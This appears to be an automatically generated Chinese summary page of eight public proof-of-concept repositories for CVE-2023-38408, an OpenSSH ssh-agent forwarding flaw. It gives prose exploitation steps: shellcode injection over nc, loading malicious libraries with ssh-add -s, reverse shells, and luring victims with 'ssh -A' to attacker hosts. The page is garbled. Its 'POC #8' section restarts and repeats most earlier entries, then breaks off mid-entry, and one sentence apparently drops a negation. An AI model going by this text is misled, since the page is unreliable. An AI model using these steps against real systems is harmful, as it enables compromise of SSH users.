**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
